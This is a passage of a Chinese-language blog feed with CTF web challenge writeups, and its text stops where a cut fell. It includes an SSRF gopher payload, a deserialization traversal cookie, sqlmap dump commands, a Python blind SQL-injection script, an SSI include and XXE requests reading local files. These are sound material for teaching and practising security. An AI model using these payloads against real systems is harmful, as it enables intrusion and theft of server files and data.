class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:///etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure></p><p>从配置文件中读到web路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line"># The ServerName directive sets the request scheme, hostname and port that</span><br><span class="line"># the server uses to identify itself. This is used when creating</span><br><span class="line"># redirection URLs. In the context of virtual hosts, the ServerName</span><br><span class="line"># specifies what hostname must appear in the request&apos;s Host: header to</span><br><span class="line"># match this virtual host. For the default virtual host (this file) this</span><br><span class="line"># value is not decisive as it is used as a last resort host regardless.</span><br><span class="line"># However, you must set it for any further virtual host explicitly.</span><br><span class="line">#ServerName www.example.com</span><br><span class="line"></span><br><span class="line">ServerAdmin webmaster@localhost</span><br><span class="line">DocumentRoot /var/www/html/ssrf/web.php</span><br><span class="line"># Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span><br><span class="line"># error, crit, alert, emerg.</span><br><span class="line"># It is also possible to configure the loglevel for particular</span><br><span class="line"># modules, e.g.</span><br><span class="line">#LogLevel info ssl:warn</span><br><span class="line"></span><br><span class="line">ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line"># For most configuration files from conf-available/, which are</span><br><span class="line"># enabled or disabled at a global level, it is possible to</span><br><span class="line"># include a line for only one particular virtual host. For example the</span><br><span class="line"># following line enables the CGI configuration for this host only</span><br><span class="line"># after it has been globally disabled with &quot;a2disconf&quot;.</span><br><span class="line">#Include conf-available/serve-cgi-bin.conf</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span><br></pre></td></tr></table></figure></p><p>依据找到的web路径去读取源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.107.145.220/?url=file:///var/www/html/ssrf/web.php</span><br></pre></td></tr></table></figure></p><p>依据源码构造gopher去post数据进而得到flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"ssrf me with parameter 'url'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </span><br><span class="line"><span class="comment">//echo $_GET['url'];</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">echo</span> curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>($_POST[<span class="string">'user'</span>]==<span class="string">"admin"</span> &amp;&amp; $ip==<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    system(<span class="string">"/var/www/html/ssrf/readflag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>最后的payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /?url=%67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%38%30%2f%5f%50%4f%53%54%20%2f%73%73%72%66%2f%77%65%62%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%25%30%64%25%30%61%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%36%25%30%64%25%30%61%55%73%65%72%2d%41%67%65%6e%74%3a%20%63%75%72%6c%2f%37%2e%31%31%2e%30%25%30%64%25%30%61%41%63%63%65%70%74%3a%20%2a%2f%2a%25%30%64%25%30%61%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%31%30%25%30%64%25%30%61%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%25%30%64%25%30%61%25%30%64%25%30%61%75%73%65%72%3d%61%64%6d%69%6e HTTP/1.1</span><br><span class="line">Host: 47.107.238.3</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><p>参考:</p><p>做题时看到的比较有意思的一篇文章，在没有得到源码前我以为题目的逻辑是这样的，因为之前我探测得到MySQL服务是存在的，但后来发现我猜错了。</p><p><a href="http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6" target="_blank" rel="noopener">Gopher 协议 ssrf MYSQL 研究</a></p><h2 id="WEB-MyNote"><a href="#WEB-MyNote" class="headerlink" title="WEB  MyNote"></a>WEB  MyNote</h2><p>题目分析:</p><p>首先找到了robots.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br></pre></td></tr></table></figure></p><p>看到内容里面包含了几个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Allow: /controllers/Basecontrol.php</span><br><span class="line">Allow: /controllers/Controllers.php</span><br><span class="line">Allow: /controllers/User.php</span><br><span class="line">Allow: /flag.php</span><br></pre></td></tr></table></figure></p><p>之后base64解码查看图片界面的返回信息发现是反序列化信息，进而构造如下数据去读取flag.php文件，最终得到flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$b[] = <span class="string">'../../flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($b)));</span><br></pre></td></tr></table></figure></p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/picture HTTP/1.1</span><br><span class="line">Host: 47.107.239.135</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: Picture=YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30%3D; PHPSESSID=a966des9csihs3pdc7plieldsh</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><p>题目下线太快了，忘记保存flag的响应包了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>参考:</p><p>这题目可以getshell，所以一直被搅屎，而且存在原题。。。</p><p><a href="https://legoc.github.io/2018/06/26/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E6%9C%88%E8%B5%9B/" target="_blank" rel="noopener">https://legoc.github.io/2018/06/26/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E6%9C%88%E8%B5%9B/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;WEB-XmeO&quot;&gt;&lt;a href=&quot;#WEB-XmeO&quot; class=&quot;headerlink&quot; title=&quot;WEB  XmeO&quot;&gt;&lt;/a&gt;WEB  XmeO&lt;/h2&gt;&lt;p&gt;题目解析:&lt;/p&gt;
&lt;p&gt;是一个ssti类型漏洞&lt;/p&gt;
&lt;p&gt;playload&lt;/p&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2018 EIS Web writeup</title>
    <link href="http://zer0yu.github.io/2018/11/17/2018-EIS-Web-writeup/"/>
    <id>http://zer0yu.github.io/2018/11/17/2018-EIS-Web-writeup/</id>
    <published>2018-11-16T16:49:25.000Z</published>
    <updated>2018-11-16T16:49:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SimpleBBS"><a href="#SimpleBBS" class="headerlink" title="SimpleBBS"></a>SimpleBBS</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>SimpleBBS</p><p><a href="http://bbs.sec.zju.edu.cn/" target="_blank" rel="noopener">http://bbs.sec.zju.edu.cn/</a></p><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析:"></a>题目解析:</h3><p>1.登录处报错<br><a href="https://i.loli.net/2018/11/16/5beede7d12704.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/16/5beede7d12704.png" alt="屏幕快照 2018-11-16 下午11.12.39.png"></a><br>2.导出burp的包使用sqlmap进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r bbs.txt --dbs</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">available databases [2]:</span><br><span class="line">[*] bbs</span><br><span class="line">[*] information_schema</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r bbs.txt -D &quot;bbs&quot; --tables</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: bbs</span><br><span class="line">[7 tables]</span><br><span class="line">+----------+</span><br><span class="line">| admin    |</span><br><span class="line">| articles |</span><br><span class="line">| comments |</span><br><span class="line">| flag     |</span><br><span class="line">| messages |</span><br><span class="line">| sections |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r bbs.txt -D &quot;bbs&quot; --tables</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: bbs</span><br><span class="line">[7 tables]</span><br><span class="line">+----------+</span><br><span class="line">| admin    |</span><br><span class="line">| articles |</span><br><span class="line">| comments |</span><br><span class="line">| flag     |</span><br><span class="line">| messages |</span><br><span class="line">| sections |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r bbs.txt -D &quot;bbs&quot; -T &quot;flag&quot; -C &quot;f&quot; --dump</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 测试的时候已经没有flag了....</span><br><span class="line">Database: bbs</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+---------+</span><br><span class="line">| f       |</span><br><span class="line">+---------+</span><br><span class="line">| &lt;blank&gt; |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><h2 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>SimpleBlog</p><p><a href="http://210.32.4.20/" target="_blank" rel="noopener">http://210.32.4.20/</a></p><h3 id="题目解析-1"><a href="#题目解析-1" class="headerlink" title="题目解析:"></a>题目解析:</h3><p>刚开始一直再找文件包含想看下源码，后来是在找不到就认真做了下题目。发现直接二次注入就好了，如果注入内容存在后面做题的分数会为0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">register = <span class="string">'http://210.32.4.20/register.php'</span></span><br><span class="line">login = <span class="string">'http://210.32.4.20/login.php'</span></span><br><span class="line">answer = <span class="string">'http://210.32.4.20/answer.php'</span></span><br><span class="line">logout = <span class="string">'http://210.32.4.20/logout.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"i:"</span>,chr(i),<span class="string">"j"</span>,chr(j)</span><br><span class="line">        req = requests.session()</span><br><span class="line">        payload = <span class="string">"\' or if((ascii(substr((select flag from flag),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"),1,0)='1' or \'"</span></span><br><span class="line">        post_answer = &#123;<span class="string">'1.a'</span>:<span class="string">'on'</span>&#125;</span><br><span class="line">        login_data = &#123;<span class="string">'username'</span>:urllib.quote(payload),<span class="string">'password'</span>:<span class="string">'zeroyu'</span>&#125;</span><br><span class="line">        r = req.post(register,data=login_data)</span><br><span class="line">        lin = req.post(login,data=login_data)</span><br><span class="line">        ans = req.post(answer,data=post_answer) </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your grades is 0'</span> <span class="keyword">not</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            f=chr(j)</span><br><span class="line">            <span class="keyword">print</span> f</span><br><span class="line">            flag=flag+f</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        lout = req.get(logout)</span><br></pre></td></tr></table></figure><h2 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>SimpleServerInjection, SSI, flag in current directory</p><p><a href="http://210.32.4.22/index.php" target="_blank" rel="noopener">http://210.32.4.22/index.php</a></p><h3 id="题目解析-2"><a href="#题目解析-2" class="headerlink" title="题目解析:"></a>题目解析:</h3><p>了解到是ssi，提示了读flag文件，常规payload发现<code>#</code>号后内容被截断，于是采用编码绕过。</p><p><a href="https://i.loli.net/2018/11/16/5bee89b30c593.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/16/5bee89b30c593.png" alt="屏幕快照 2018-11-16 下午5.07.19.png"></a><br><a href="https://i.loli.net/2018/11/16/5bee89b30e32f.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/16/5bee89b30e32f.png" alt="屏幕快照 2018-11-16 下午5.08.55.png"></a></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--%23include+virtual%3D&quot;flag&quot;+--&gt;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h3><p><a href="https://junookyo.blogspot.com/2012/03/shtml-bypass-view-symlink-server-side.html" target="_blank" rel="noopener">https://junookyo.blogspot.com/2012/03/shtml-bypass-view-symlink-server-side.html</a></p><p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/66934.html</a></p><p><a href="http://xdxd.love/2015/12/09/ssi%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">http://xdxd.love/2015/12/09/ssi%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/</a></p><h2 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>SimpleExtensionExplorerInjection, XXE, /flag</p><p><a href="http://210.32.4.21:8080/www/index.html" target="_blank" rel="noopener">http://210.32.4.21:8080/www/index.html</a></p><h3 id="题目解析-3"><a href="#题目解析-3" class="headerlink" title="题目解析:"></a>题目解析:</h3><p>1.burp抓包发现采用json格式传输数据</p><p><a href="https://i.loli.net/2018/11/16/5bee8a4b4c115.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/16/5bee8a4b4c115.png" alt="屏幕快照 2018-11-16 下午5.13.33.png"></a></p><p>2.修改<code>Content-Type</code>字段为<code>xml</code>，尝试post xml格式数据</p><p>根据请求和响应发现存在xxe漏洞</p><p>请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /www/ HTTP/1.1</span><br><span class="line">Host: 210.32.4.21:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://210.32.4.21:8080/www/index.html</span><br><span class="line">Content-Type: application/xml; charset=UTF-8</span><br><span class="line">Content-Length: 73</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;name&gt;zzz&lt;/name&gt;</span><br><span class="line">&lt;age&gt;zzz&lt;/age&gt;</span><br></pre></td></tr></table></figure></p><p>响应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 500 </span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Date: Fri, 16 Nov 2018 09:17:40 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 254</span><br><span class="line"></span><br><span class="line">&#123;&quot;timestamp&quot;:&quot;2018-11-16T09:17:40.797+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;org.xml.sax.SAXParseException; lineNumber: 3; columnNumber: 2; The markup in the document following the root element must be well-formed.&quot;,&quot;path&quot;:&quot;/www/&quot;&#125;</span><br></pre></td></tr></table></figure><p>3.依据提示<code>/flag</code>，直接去读文件</p><p>请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /www/ HTTP/1.1</span><br><span class="line">Host: 210.32.4.21:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://210.32.4.21:8080/www/index.html</span><br><span class="line">Content-Type: application/xml; charset=UTF-8</span><br><span class="line">Content-Length: 151</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;name&lt;/name&gt;</span><br><span class="line">&lt;age&gt;&amp;xxe;&lt;/age&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></p><p>响应:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 64</span><br><span class="line">Date: Fri, 16 Nov 2018 09:21:23 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Received name: name, age: EIS&#123;bce52c116d589ae9472e59a162cc90e2&#125;</span><br></pre></td></tr></table></figure><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考:"></a>参考:</h3><p><a href="https://blog.netspi.com/playing-content-type-xxe-json-endpoints/" target="_blank" rel="noopener">https://blog.netspi.com/playing-content-type-xxe-json-endpoints/</a></p><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a></p><h2 id="SimplePrintEventLogger"><a href="#SimplePrintEventLogger" class="headerlink" title="SimplePrintEventLogger"></a>SimplePrintEventLogger</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>SimplePrintEventLogger, same server as SimpleExtensionExploreInjection , RCE, flag in /</p><p><a href="http://210.32.4.21:8080/www/index.html" target="_blank" rel="noopener">http://210.32.4.21:8080/www/index.html</a></p><h3 id="题目解析-4"><a href="#题目解析-4" class="headerlink" title="题目解析:"></a>题目解析:</h3><p>同一个题目的服务器上，flag在根目录，手动翻一下就好</p><p>请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /www/ HTTP/1.1</span><br><span class="line">Host: 210.32.4.21:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://210.32.4.21:8080/www/index.html</span><br><span class="line">Content-Type: application/xml; charset=UTF-8</span><br><span class="line">Content-Length: 147</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;name&lt;/name&gt;</span><br><span class="line">&lt;age&gt;&amp;xxe;&lt;/age&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></p><p>响应<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 169</span><br><span class="line">Date: Fri, 16 Nov 2018 16:46:04 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Received name: name, age: .dockerenv</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">docker-java-home</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">flagvvvvvaaaagegsgag2333</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span 